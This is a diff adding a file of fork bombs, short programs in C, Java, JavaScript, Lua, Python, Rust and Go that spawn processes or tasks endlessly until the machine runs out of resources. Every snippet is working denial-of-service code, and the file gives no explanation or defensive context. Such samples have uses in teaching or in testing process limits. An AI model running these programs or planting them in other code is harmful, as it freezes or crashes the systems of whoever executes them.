@@ -1,0 +1,63 @@
+#include <sys/types.h>
+#include <unistd.h>
+
+int main()
+{
+    while (1)
+      fork();
+}
+
+
+
+public class ForkBomb
+{
+    public static void main(String[] args)
+    {
+        while (true)
+        {
+            Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+        }
+    }
+}
+
+
+(function (fn) {
+  return fn(fn);
+})(async function (fn) {
+  return fn(fn) && fn(fn);
+});
+
+
+-- Requires `luaposix' module
+local unistd = require "posix.unistd"
+
+while true do
+  unistd.fork()
+end
+
+
+import os
+while True:
+    os.fork()
+
+#[allow(non_camel_case_types)]
+type pid_t = i32;
+
+extern "C" {
+    fn fork() -> pid_t;
+}
+
+fn main() {
+    loop {
+        unsafe { fork(); }
+    }
+}
+
+package main
+
+func main() {
+	for {
+		go main()
+	}
+}
+
